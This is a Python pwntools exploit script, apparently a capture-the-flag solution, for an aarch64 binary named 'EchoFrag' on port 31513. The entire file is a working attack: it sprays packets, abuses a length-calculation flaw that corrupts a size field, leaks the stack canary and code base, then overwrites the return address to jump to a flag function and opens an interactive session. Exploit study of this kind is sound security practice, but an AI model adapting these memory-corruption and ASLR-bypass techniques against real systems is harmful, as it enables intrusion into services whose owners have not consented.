from binascii import hexlify
from pwn import *
from time import sleep


# p = process("qemu-aarch64 -L /usr/aarch64-linux-gnu/ -g 1234 ./deploy/EchoFrag".split(' '), stderr=2)
# p = process("qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./deploy/EchoFrag".split(' '), stderr=2)
p = remote('localhost', 31513)
# p = remote('ctf.ssat.site', 31513)

CHUNK_START = 1
CHUNK_CONTINUE = 2
HEADER_SIZE = 3

def gen_chunk(TYPE, size, data=b''):
    return p8(TYPE) + p16(size) + data

print('Phase #1 spray number indexes')
size = 0x200
p.send(gen_chunk(CHUNK_START, size))
sleep(0.1)
payload = bytearray([i%0x100 for i in range(size - HEADER_SIZE)])
p.send(gen_chunk(CHUNK_CONTINUE, size, payload ))
x = p.recv(0x1000)

input('Phase #2 find memory location')
size = 0x80 - 0xc
start_packet_size = (HEADER_SIZE+size)-4
p.send(gen_chunk(CHUNK_START, size, b'B'*start_packet_size))
sleep(0.1)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x11'*0x10 ))
sleep(0.1)

x = p.recv(0x1000)
print(hexdump(x))
print('packet data length: {}'.format(hex(size)))
print('START packet size: {}'.format(hex(start_packet_size+3)))
print('START next packet offset: {} - 3 = {}'.format(hex(start_packet_size), hex(start_packet_size)))
print('CONTINUE packet size: 0x13')
print('CONTINUE packet is overflowed: {} + 0x13 - 3 > {}'.format(hex(start_packet_size), hex(size)))

print('CONTINUE packet memcpy size calculated: {} - {} - 3 = {}'.format(hex(size) , hex(start_packet_size), hex(size-(start_packet_size)-3)))
print('CONTINUE packet memcpy(dst, src, -2) override 0x2e ~ 0x6c')

input('Phase #3 respray number indexes')
size = 0x200
p.send(gen_chunk(CHUNK_START, size))
sleep(0.1)
payload = bytearray([i%0x100 for i in range(size - HEADER_SIZE)])
payload = payload[:0x1c3] + bytearray([0x60, 0x04]) + payload[0x1c5:]
p.send(gen_chunk(CHUNK_CONTINUE, size, payload ))
x = p.recv(0x1000)

size = 0x80 - 0xc
start_packet_size = (HEADER_SIZE+size)-4
p.send(gen_chunk(CHUNK_START, size, b'B'*start_packet_size))
sleep(0.1)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x11'*0x10 ))
sleep(0.1)
x = p.recv(0x1000)
print(hexdump(x))
print('MAKE 0x2e ~ 0x2f [60 04] means length to "0x460"')
print('packet size {} -> {}'.format(hex(size), hex(size-0x30)))



input('Phase #3 LEAK STACK CANARY')
size = 0x80 - 0xc - 0x30
start_packet_size = (HEADER_SIZE+size)-4
p.send(gen_chunk(CHUNK_START, size, b'C'*start_packet_size))
sleep(0.1)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x11'*0x10 ))
sleep(0.1)
x = p.recv(0x3000)
print(hexdump(x[5:]))
stack_canary = x[5:][0x408:0x410]
CODE_ASLR    = x[5:][0x428:0x430]
CODE_BASE    = u64(CODE_ASLR) - 0x914
print('[>] STACK CANARY: ', hexlify(stack_canary))
print('[>] CODE ASLR: ', hexlify(CODE_ASLR))
print('[>] CODE BASE: ', hex(CODE_BASE))

GET_FLAG_FUNC_OFFSET = 0x0000000000000a28
GET_FLAG = CODE_BASE + GET_FLAG_FUNC_OFFSET
print('[>] GET_FLAG_FUNC_ADDR: ', hex(GET_FLAG))


input('Phase #3 OVERFLOW')
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x11'*0x100 ))
sleep(0.1)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x12'*0x100 ))
sleep(0.2)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x13'*0x100 ))
sleep(0.2)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x14'*0x80 ))
sleep(0.2)
p.send(gen_chunk(CHUNK_CONTINUE, 24, b'\x15'*(0x80+0x4 + 1 + 0x8) \
    + stack_canary \
    + b'\x00'*8 \
    + p64(GET_FLAG) \
    + b'\xde\xad\xbe\xef\xca\xfe\xba\xbe'
    + b'\x22'*(0x6+0x68)
    ))
sleep(0.2)
x = p.recv(0x3000)
print(hexdump(x[5:]))
stack_canary = x[5:][0x408:0x410]
print('[>] STACK CANARY: ', hexlify(stack_canary))


p.interactive()
